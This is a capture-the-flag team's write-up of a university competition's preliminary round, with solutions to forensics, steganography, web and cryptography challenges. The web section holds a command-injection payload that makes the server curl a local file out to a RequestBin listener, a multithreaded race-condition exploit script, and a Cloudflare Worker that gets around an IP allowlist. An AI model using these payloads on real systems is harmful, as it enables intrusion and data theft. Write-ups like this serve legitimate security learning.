---
title: 'UM Cybersummit 2025 Preliminary Writeups'
description: 'First ever CTF hosted by UM!'
date: 2025-4-14
tags: ['writeups']
image: './logo.jpg'
authors: ['tony', 'bakayang', 'weixuan', 'grid']
---

# Forensic

## Hidden in Plain Graphic

![](./image/Picture8.png)

### Executive Summary

This challenge involved analyzing network traffic **_pcap_** file to uncover a hidden PNG file. After extracting and inspecting the image, we discovered the flag hidden using steganography

### Challenge Overview

We were given a **_.pcap_** file and asked to investigate for hidden data. The goal was to locate and extract a hidden flag potentially embedded in a transmitted file.

### Tools used

1. Wireshark
2. Aperisolve

### Static Analysis

1. First, sort by length (descending) in Wireshark to spot large packets that might contain file data.
2. We found this suspiciously large data file.
   ![](./image/Picture1.png)
3. Follow the TCP stream of the suspicious packets.
   ![](./image/Picture2.png)
4. Within the stream, we found **_PNG_** file headers.
   ![](./image/Picture3.png)
5. We exported the **_raw_** sream data file. (switching to raw is important)
   ![](./image/Picture4.png)
6. Upon saving the file as **_.png_** and opening the file, we confirmed it's an image.
7. Uploading the PNG to **_Aperisolve_** to scan for embedded steganographic data.
   ![](./image/Picture5.png)
8. Flag: `umcs{h1dd3n_1n_png_st3g}`
   ![](./image/Picture6.png)

### Takeaways

This challenge highlights how data can be quietly hidden in seemingly ordinary traffic. Knowing what file signatures look like and using tools like Aperisolve is key to solving basic stego-over-network forensics.

# Steganography

## Broken

![](./image/Picture7.png)

### Executive Summary

A suspicious **_broken.mp4_** file was suspected of containing a hidden flag. Initial attempts to play the file failed, indicating structural corruption. Through a combination of static analysis, binary inspection, and media recover techniques, the file was repaired and a hidden flag was succesfully extracted from the video frame.

### Case Details

**_Objective_**: Recover the hidden flag from a corrupted **_broken.mp4_** file provided during the forensic challenge
**_Initial Observation:_**:
‚Ä¢ The file could not be played in any media player.
‚Ä¢ Tools like **_ffmpeg_** and **_exiftool_** were used for deeper inspection.
‚Ä¢ Manual binary inspection via hex editor suggested intentional tampering.

### Requirements

‚Ä¢ Knowledge of MP4 file structure (ftyp, moov, mdat atoms).
‚Ä¢ Familiarity with ffmpeg, exiftool, and hex editors for static analysis.
‚Ä¢ Understanding of video encoding schemes (H.264 in this case)
‚Ä¢ Ability to reconstruct or repair partial media file structures.

### Static Analysis

1. Hex inspection & obtain a sample.
   Key points:
   ‚Ä¢ **_ftypisom_** header, this indicate that it is ISO Base Media file MPEG-4
   ![](./image/Picture10.png)
   ‚Ä¢ **_H264 encoded format_**
   ![](./image/Picture11.png)
   To solve this, we thought of obtaining a sample for ease of comparison by recording with OBS since OBS allows to tweak the recording output format, so we screenrecorded under **_H264_** encoding and output as **_.mp4_** file
2. Comparative Sample Analysis
   | Original | Sample |
   | -------- | ------- |
   | ![](./image/Picture12.png)| ![](./image/Picture13.png)|

Notice that the file header of ftypisom type of .mp4 file header should be started with \x00\x00\x00\x02 followed by magic bytes ftypisom, hence we should fix the header by referring the sample.
\*\*The file still don‚Äôt run, further analysis required

3. Anomaly discorvery via ExifTool and ffmpeg
   ![](./image/Picture14.png)
   ![](./image/Picture15.png)
   Anomaly found at offset 0x38e5, moov not found
4. Repair the corruption
   ![](./image/Picture16.png)
   ![](./image/Picture17.png)
   Appending **_‚Äòo‚Äô_** character into **_‚Äúmoov‚Äù_**

### Flag Extraction

Opened fixed MP4 in a video editor, found a visible frame in the video displaying the flag.
![](./image/Picture18.png)

Flag: `umcs{h1dd3n_1n_fr4m3}`

## Hotline Miami

![](./image/Picture19.png)

### Executive Summary

This challenge required investigating three files (JPG, TXT, and WAV) to discover hidden information through steganographic techniques.

### Challenge Overview

The challenge provided three main files: rooster.jpg, readme.txt, and iamthekidyouknowwhatimean.wav. To solve it, we needed to analyze each file and connect the clues, requiring some out-of-the-box thinking. The flag format was provided in the readme.txt file.

### Tools used

‚Ä¢ Sonic Visualiser
‚Ä¢ Notepad
‚Ä¢ Google

### Analysis & Flag Extraction

1. First we start the analysis by using the sonic visualiser to view the spectrogram of the (iamthekidyouknowhwhatimean.wav) file.

2. We can see clearly there is a word of _Watching 1989_ on the spectrogram view.

![](./image/Picture20.png)

3. Next let see on the text file. we can see there is **_DO YOU LIKE HURTING OTHER PEOPLE?_** **_Subject_Be_Verb_Year_** and we think the Subject_Be_Verb_Year is the format for the flags.

![](./image/Picture21.png)

4. Search online for the jpg we can found that there is a name for this rooster call Richard.

![](./image/Picture22.png)

5. Lastly we try to search online what is Hotline Miami. It show that it is a game in Steam.

![](./image/Picture23.png)

6. Going search for the games wiki, we can found that there is story of it.

7. Ctrl + f search the clue given "DO YOU LIKE HURTING OTHER PEOPLE?" and we can found that it is a dialogue from Richard.

![](./image/Picture24.png)

8. And yes we double check it and we knew the subject must be Richard, verb is Watching, Year is 1989.

Flag : `umcs{richard_be_watching_1989}`

# Web

## Healthcheck

![](./image/Picture25.png)

### Executive Summary

This website lets you use the curl command after filtering input with a basic blacklist. The input is passed to shell_exec, making it possible to bypass the filter and inject commands. The goal is to exploit this for code execution.

### Tools used

‚Ä¢ BurpSuite
‚Ä¢ RequestBin

### Source Code Analysis

Based on the source code, the interesting part is on top:

```php
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["url"])) {
    $url = $_POST["url"];

    $blacklist = [PHP_EOL,'$',';','&','#','`','|','*','?','~','<','>','^','<','>','(', ')', '[', ']', '{', '}', '\\'];

    $sanitized_url = str_replace($blacklist, '', $url);

    $command = "curl -s -D - -o /dev/null " . $sanitized_url . " | grep -oP '^HTTP.+[0-9]{3}'";

    $output = shell_exec($command);
    if ($output) {
        $response_message .= "<p><strong>Response Code:</strong> " . htmlspecialchars($output) . "</p>";
    }
}
?>
```

We found out that $blacklist, this need to be avoided.

```
$blacklist = [PHP_EOL,'$',';','&','#','`','|','*','?','~','<','>','^','<','>','(', ')', '[', ']', '{', '}', '\\'];
```

### Exploitation

1. First, we noticed that our **_user input_** is passed into the curl command after being sanitized using a basic blacklist.
   Nice! That means we can try **_command injection_** here.

2. Since they're using **_curl_**, we can log HTTP requests by pointing the command to a custom endpoint. For that, we use a **_RequestBin_** to track the website‚Äôs outgoing requests.

3. We‚Äôre also given a hint: the keyword **_hopes_and_dreams_**
   ‚Äì sounds like something important will be sent to our listener

4. So, we set up a listener and craft a payload to trigger the request.

Note: here we use [RequestBin](https://requestbin.kanbanbox.com/) for this, but webhook.site can also be used, or any custom HTTP logger are applicable.

![](./image/Picture26.png)

### Final Payload

```bash
https://requestbin.kanbanbox.com/XXXXXX -o /dev/null -X POST --data-binary @hopes_and_dreams
```

https://requestbin.kanbanbox.com/XXXXXX  
‚Ä¢ This is the **_destination URL_**: RequestBin listener that logs incoming HTTP requests.

-o /dev/null
‚Ä¢ Tells **_curl_** to **_discard the response body_**. We don't care what the server sends back.

-X POST
‚Ä¢ Forces the method to **_POST_**, which is important for sending data.

**_--data-binary @hopes_and_dreams_**
‚Ä¢ This uploads a local file named **_hopes_and_dreams_** from the server.  
‚Ä¢ The @ tells curl to read the **_contents of the file_** and send it as the request body.

### Flag Extraction

After we've done submitting the **_$payload_**, we can just get our flag on the **_RequestBin_**.
![](./image/Picture27.png)

Flag: `umcs{n1c3_j0b_ste411ng_myh0p3_4nd_dr3ams}`

## Straightforward

![](./image/Picture28.png)
![](./image/Picture29.png)

### Executive Summary

This challenge presents an online reward system where users can collect daily bonuses to earn points and purchase a flag. But it contains a race **_condition vulnerability_** in the bonus claim mechanism that allows users to claim multiple bonuses simultaneously, bypassing the intended limitation of one bonus per user. By exploiting this vulnerability, we were able to accumulate sufficient balance to purchase the flag.

### Tools used

‚Ä¢ Python

### Static Analysis

Based on the source code, there are some interesting parts:

1. Database Schema:
   ‚Ä¢ **_users table_**: Stores username and balance
   ‚Ä¢ **_redemptions table_**: Tracks which users have claimed their daily bonus

2. Critical Vulnerability: The /claim endpoint contains a race condition:

```php
# Check if already claimed
   cur = db.execute('SELECT claimed FROM redemptions WHERE username=?', (username,))
   row = cur.fetchone()
   if row and row['claimed']:
       flash("You have already claimed your daily bonus!", "danger")
       return redirect(url_for('dashboard'))

   # Update database - these operations are not atomic
   db.execute('INSERT OR REPLACE INTO redemptions (username, claimed) VALUES (?, 1)', (username,))
   db.execute('UPDATE users SET balance = balance + 1000 WHERE username=?', (username,))
   db.commit()

```

The critical issue is that the check and update operations are not performed atomically. There's a time window between checking if a user has claimed the bonus and marking it as claimed, allowing multiple simultaneous requests to pass the check before any single request updates the database.

3. Flag Access: The **_/buy_flag_** endpoint verifies a user's balance before providing the flag:

```php
if row and row['balance'] >= 3000:
    db.execute('UPDATE users SET balance = balance - 3000 WHERE username=?', (username,))
    db.commit()
    flash("Reward redeemed!", "success")
    return render_template('flag.html')

```

### Final Payload

We developed a Python script to exploit the race condition vulnerability:

```php
import requests
import threading
import re
import time

url = "http://159.69.219.192:7859/"

username = f"test{int(time.time())}"
session = requests.Session()
register_resp = session.post(f"{url}/register", data={"username": username})
print(f"Registered as: {username}")

def claim_bonus():
    try:
        resp = session.post(f"{url}/claim")
        if "Daily bonus collected" in resp.text:
            print("Successfully claimed bonus!")
        elif "already claimed" in resp.text:
            print("Claim blocked - already claimed")
    except Exception as e:
        print(f"Error: {str(e)}")

threads = []
num_threads = 30

print(f"Launching {num_threads} simultaneous claim attempts...")
for i in range(num_threads):
    t = threading.Thread(target=claim_bonus)
    threads.append(t)

for t in threads:
    t.start()

for t in threads:
    t.join()

dashboard_resp = session.get(f"{url}/dashboard")
balance_match = re.search(r'Your current balance: <strong>\$(\d+)</strong>', dashboard_resp.text)

if balance_match:
    balance = int(balance_match.group(1))
    print(f"Current balance: ${balance}")

    if balance >= 3000:
        print("Balance sufficient! Buying flag...")
        flag_resp = session.post(f"{url}/buy_flag")

        if "UMCS{" in flag_resp.text:
            flag_match = re.search(r'UMCS\{[^}]+\}', flag_resp.text)
            if flag_match:
                print(f"FLAG FOUND: {flag_match.group(0)}")
            else:
                print("Flag format not detected, but here's response:")
                # Print part of the response to see the flag
                print(flag_resp.text[:500] + "...")
        else:
            print("Could not find flag in response")
    else:
        print(f"Need ${3000 - balance} more to buy the flag")
else:
    print("Could not determine balance")

```

The race condition works because:
‚Ä¢ The server first checks if a user has already claimed the bonus
‚Ä¢ Then separately updates the database to mark it as claimed
‚Ä¢ When multiple requests hit simultaneously, several can pass the initial check before any mark the bonus as claimed
‚Ä¢ Each successful request increases the user's balance by $1000

### Flag Extraction

![](./image/Picture30.png)

Flag: `UMCS{th3_s0lut10n_1s_pr3tty_str41ghtf0rw4rd_too!}`

## Microservices

![](./image/Picture31.png)

### Executive Summary

This challenge required investigating on the source file and find the vulnerable code to access the flag files using the correct IP address.

### Challenge Overview

This challenge need to have knowledge of how does the api works and how to overrides the ban ip to get in to the 5555 port and retrieve the flag

### Tools used

‚Ä¢ Cloudflare Workers
‚Ä¢ Visual Studio Code

### Analysis

1. First we start the analysis by the source code given by the challenges

![](./image/Picture32.png)

2. Then we have a check on how should we overrides the code as we can see there is a things we should bypass to get into the 5555 port and open the flag files.

3.

```nginx
server {
        listen 80;

        location / {
            # Private IPs
            allow 127.0.0.1;
            allow ::1;
            allow 172.18.0.0/16;
            allow 10.0.0.0/8;
            allow 172.16.0.0/12;
            allow 192.168.0.0/16;

            # Cloudflare IPs
            allow 103.21.244.0/22;
            allow 103.22.200.0/22;
            allow 103.31.4.0/22;
            allow 104.16.0.0/13;
            allow 104.24.0.0/14;
            allow 108.162.192.0/18;
            allow 131.0.72.0/22;
            allow 141.101.64.0/18;
            allow 162.158.0.0/15;
            allow 172.64.0.0/13;
            allow 173.245.48.0/20;
            allow 188.114.96.0/20;
            allow 190.93.240.0/20;
            allow 197.234.240.0/22;
            allow 198.41.128.0/17;

            deny all;

            proxy_pass http://localhost:5555;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_http_version 1.1;
        }
```

4. We can see in this code in the default.conf file, only private or cloudflare IP is available to allow access into the api server.

5. Cloudflare workers done the work for this case to change the ip address to GET the file from the server as it allow the access of cloudflare IP.

6. Then we write a script to run on the cloudflare workers playground to fetch the text from the server.sttsst

```python
export default {
  async fetch(request, env, ctx) {
    const response = await fetch("http://microservices-challenge.eqctf.com:5555/flag", {
      method: "GET",
      headers: {
        "Accept": "application/json",
      },
    });

    const data = await response.text();
    return new Response(data, {
      headers: { "Content-Type": "text/plain" },
    });
  },
};

```

7. Run the script and we can get the flag directly from the server.

8. Cloudflare Workers

![](./image/Picture33.png)

### Takeaways

‚Ä¢ IP Whitelisting Alone is Not Secure ‚Äì Additional protections are needed.  
‚Ä¢ Cloudflare Workers Can Bypass IP Bans ‚Äì Useful for testing and authorized penetration testing.

### CREDITS

Thank you **_benkyou@USM_Biawaks_** for providing hint of the chall **_after the end_** of UMCS CTF Preliminary Round.

# Cryptography

## Gist of Samuel

![](./image/Picture34.png)

### Executive Summary

This challenge involved decoding a hidden message using a combination of Morse code and the Rail Fence cipher. The solution required analyzing an emoji-encoded file, translating it to Morse, and applying a Rail Fence Cipher to reveal the final flag.

### Challenge Overview

The challenge provided:

1. gist_of_samuel.txt ‚Äì A file filled with unusual Unicode symbols (üöÇ, üöÜ, üöã).
2. Samuel is one of the author that write the morse code.
3. GitHub Gist ‚Äì Containing ASCII art that held the final flag.

### Tools used

‚Ä¢ Python (for Morse code translation)  
‚Ä¢ Rail Fence cipher decoder (online tool)
‚Ä¢ Courier New font (to properly render ASCII art)

### Analysis

1. Decoding the Unicode File

The file contained strange symbols (`üöÇ`, `üöÜ`, `üöã`), suggesting misinterpreted binary data or a custom encoding.
Upon closer inspection, these symbols resembled Morse code when mapped to:

‚Ä¢ `üöÇ` ‚Üí Dot (.)  
‚Ä¢ `üöã` ‚Üí Dash (‚Äì)  
‚Ä¢ `üöÜ` ‚Üí Separator ( )

Python Script for Morse Decoding:

```python
morse_dict = {
    '.-': 'A', '-...': 'B', '-.-.': 'C', '-..': 'D', '.': 'E',
    '..-.': 'F', '--.': 'G', '....': 'H', '..': 'I', '.---': 'J',
    '-.-': 'K', '.-..': 'L', '--': 'M', '-.': 'N', '---': 'O',
    '.--.': 'P', '--.-': 'Q', '.-.': 'R', '...': 'S', '-': 'T',
    '..-': 'U', '...-': 'V', '.--': 'W', '-..-': 'X', '-.--': 'Y',
    '--..': 'Z', '.----': '1', '..---': '2', '...--': '3', '....-': '4',
    '.....': '5', '-....': '6', '--...': '7', '---..': '8', '----.': '9',
    '-----': '0', '.-.-.-': '.', '--..--': ',', '..--..': '?',
    '.----.': "'", '-..-.': '/', '-.--.': '(', '-.--.-': ')',
    '.-...': '&', '---...': ':', '-.-.-.': ';', '-...-': '=',
    '.-.-.': '+', '-....-': '-', '..--.-': '_', '.-..-.': '"',
    '...-..-': '$', '.--.-.': '@'
}

file_path = 'gist_of_samuel.txt'

with open(file_path, 'r', encoding='utf-8') as f:
    content = f.read().strip()

morse_text = content.replace('üöÇ', '.').replace('üöã', '-').replace('üöÜ', ' ')

morse_chars = morse_text.split(' ')

result = ''
for char in morse_chars:
    if char in morse_dict:
        result += morse_dict[char]
    elif char == '':
        continue
    else:
        result += f"[{char}]"

print("DONE:")
print(result)

```

Output:

```
DONE:
HERE[.......]IS[.......]YOUR[.......]PRIZE[.......]E012D0A1FFFAC42D6AAE00C54078AD3E[.......]SAMUEL[.......]REALLY[.......]LIKES[.......]TRAIN,[.......]AND[.......]HIS[.......]FAVORITE[.......]NUMBER[.......]IS[.......]8
```

2. Identifying the Cipher
   The decoded message included:  
   ‚Ä¢ "**_SAMUEL REALLY LIKES TRAIN_**" ‚Üí Hinting at Rail Fence cipher (rail = train tracks). (Look also at the question given of the challenge 'gatekeeping')
   ‚Ä¢ "**_FAVORITE NUMBER IS 8_**" ‚Üí Should be the key for the cipher.
   ‚Ä¢ "**_E012D0A1FFFAC42D6AAE00C54078AD3E_**" ‚Üí A hexadecimal string identifying the GitHub Gist.

3. Retrieving the GitHub Gist
   ‚Ä¢ Using the hex string from the decoded message, we accessed the GitHub Gist at:
   https://gist.github.com/umcybersec/e012d0a1fffac42d6aae00c54078ad3e
   ![](./image/Picture35.png)

‚Ä¢ The Gist contained what appeared to be ASCII art, but it was encoded with the Rail Fence cipher.

4. Applying the Rail Fence Cipher

‚Ä¢ The Rail Fence cipher is a transposition cipher that arranges text in a zigzag pattern across a specified number of "rails."
‚Ä¢ Using the hint that Samuel's favorite number is 8, we applied the Rail Fence decoder with 8 rails and Offset = 0.

Decoding Process:

1. Copy the content from the Github Gist
2. Use an online Rail Fence decoder.
3. Set the number of rails to 8.
4. Apply the decryption algorithm.
